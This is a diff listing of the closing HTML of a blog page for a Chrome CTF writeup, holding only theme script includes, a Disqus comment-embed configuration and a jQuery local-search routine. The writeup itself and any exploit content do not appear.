+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://eternalsakura13.com/2019/04/29/*ctf_oob/';
+          this.page.identifier = '2019/04/29/*ctf_oob/';
+          this.page.title = 'star ctf chrome oob writeup';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
